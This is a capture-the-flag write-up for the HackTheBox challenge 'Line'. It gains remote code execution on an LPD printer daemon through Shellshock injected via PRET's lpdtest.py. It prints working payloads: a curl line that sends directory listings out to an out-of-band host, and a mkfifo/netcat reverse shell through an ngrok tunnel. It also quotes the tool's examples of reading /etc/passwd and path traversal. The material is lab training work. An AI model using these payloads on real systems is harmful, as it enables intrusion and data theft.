# HackTheBox Challenge - Line
## Description
>During an architectural review of printers on our network, we found an LPD protocol implementation running on a network printer. Can you help in auditing this service?

## What we know
- We are dealing with a LPD Daemon.
- There is going to be some flaw with the LPD implementation.
- Most likely running some form of *nix under the hood.

## First steps
- After searching for some tools to make life easier, found PRET @ https://github.com/RUB-NDS/PRET
- PRET has a tool lpd/lpdtest.py to make interaction with the daemon easier.
- lpdtest.py requires python2

### lpdtest.py -h output
```
┌──(kali㉿kali)-[~/PRET/lpd]
└─$ python3 lpdtest.py -h                                                      
usage: lpdtest [-h] [--port PORT] hostname {get,put,rm,in,mail,brute} argument

Line Printer Daemon Protocol (RFC 1179) Test.

positional arguments:
  hostname              printer ip address or hostname
  {get,put,rm,in,mail,brute}
                        select lpd proto security test
  argument              specific to test, see examples

options:
  -h, --help            show this help message and exit
  --port PORT           printer port

example usage:
  lpdtest printer get /etc/passwd
  lpdtest printer put ../../etc/passwd
  lpdtest printer rm /some/file/on/printer
  lpdtest printer in '() {:;}; ping -c1 1.2.3.4'
  lpdtest printer mail lpdtest@mailhost.local
  lpdtest printer brute ./printerLdpList.txt --port 1234
  ```
  
 ## Using lpdtest.py
 - Testing get and put was fruitless.
 - Using the `in` argument gave a example of using a shellshock vulnerability.
 - Since we can't see the output, I tested to see if Burp Collaborator would see a DNS query with:
  
   `python lpdtest.py --port 311xx 138.68.x.x in '() {:;}; ping #######.oastify.com'`
   - Received: > The Collaborator server received a DNS lookup of type AAAA for the domain name #######.oastify.com.

## Success, we have RCE! Time to find the flag.
- Tried to simply list the contents of directories and have them be POSTed to Burp Collaborator with:

  `python lpdtest.py --port 311xx 138.68.x.x in '() {:;}; ls -lha | curl -F file=@- http://######.oastify.com/api/upload'`
```
POST /api/upload HTTP/1.1
User-Agent: curl/7.35.0
Host: ######.oastify.com
Accept: */*
Content-Length: 1505
Expect: 100-continue
Content-Type: multipart/form-data; boundary=------------------------c5749f677739a93a

--------------------------c5749f677739a93a
Content-Disposition: form-data; name="file"; filename="-"
Content-Type: application/octet-stream

total 1.4M
drwxr-xr-x   1 root root 4.0K Oct  6 21:48 .
drwxr-xr-x   1 root root 4.0K Oct  6 21:48 ..
-rw-r--r--   1 root root 1.3M Apr 10  2010 bash_4.1-3_amd64.deb
drwxr-xr-x   1 root root 4.0K Aug 17  2021 bin
drwxr-xr-x   2 root root 4.0K Apr 10  2014 boot
drwxr-xr-x   5 root root  360 Oct  6 21:03 dev
drwxr-xr-x   1 root root 4.0K Aug 17  2021 etc
drwxr-xr-x   2 root root 4.0K Apr 10  2014 home
drwxr-xr-x   1 root root 4.0K Aug 17  2021 lib
drwxr-xr-x   2 root root 4.0K Dec 17  2019 lib64
drwxr-xr-x   2 root root 4.0K Dec 17  2019 media
drwxr-xr-x   2 root root 4.0K Apr 10  2014 mnt
drwxr-xr-x   1 root root 4.0K Aug 17  2021 opt
dr-xr-xr-x 479 root root    0 Oct  6 21:03 proc
drwx------   1 root root 4.0K Aug 17  2021 root
drwxr-xr-x   1 root root 4.0K Mar 25  2021 run
drwxr-xr-x   1 root root 4.0K Mar 25  2021 sbin
drwxr-xr-x   2 root root 4.0K Dec 17  2019 srv
dr-xr-xr-x  13 root root    0 Oct  6 21:03 sys
-rw-r--r--   1 root root  111 Oct  6 21:38 test
-rw-r--r--   1 root root  956 Oct  6 21:44 test2
-rw-r--r--   1 root root    0 Oct  6 21:45 test3
-rw-r--r--   1 root root    0 Oct  6 21:46 test4
-rw-r--r--   1 root root    0 Oct  6 21:51 test5
drwxrwxrwt   2 root root 4.0K Dec 17  2019 tmp
drwxr-xr-x   1 root root 4.0K Dec 17  2019 usr
drwxr-xr-x   1 root root 4.0K Dec 17  2019 var

--------------------------c5749f677739a93a--
```
- This worked, but there were issues when trying to do commands like `ls -lha /etc` where no request would be sent.


- I gave up trying to determine the exact issue with the directory listing and running some commands and switched to using a reverse shell. 
- Used ngrok to get a tunnel to my PC `ngrok tcp 4444`
- Used netcat listening on port 4444 `nc -lvp 4444`
- Running `nc` normally with `nc HOST PORT -e /bin/bash` and other shells failed:
```
└─$ python lpdtest.py --port 311xx 138.68.xx.xx in '() {:;}; nc 0.tcp.ngrok.io 187xx –e /bin/bash'
[in] Trying to send user input '() {:;}; nc 0.tcp.ngrok.io 187xx –e /bin/bash'
Negative acknowledgement
```
- Trying a different method to launch nc finally worked: `python lpdtest.py --port 311xx 138.68.x.x in '() {:;}; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 0.tcp.ngrok.io 187xx >/tmp/f'`
```
└─$ nc -lvp 4444               
listening on [any] 4444 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 423xx
sh: 0: can't access tty; job control turned off
# ls
bash_4.1-3_amd64.deb
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
test
test2
test3
test4
test5
tmp
usr
var
```
- Now I had a shell and I needed was to find the flag:
```
# find / -name flag*
/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/proc/sys/kernel/sched_domain/cpu2/domain0/flags
/proc/sys/kernel/sched_domain/cpu3/domain0/flags
/xxx/flag.txt
/sys/devices/pnp0/00:00/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
# cat /xxx/flag.txt
HTB{XXXXXXX_XXX_XX_XXXX_XXXXXXX}
```
Challenge Complete!
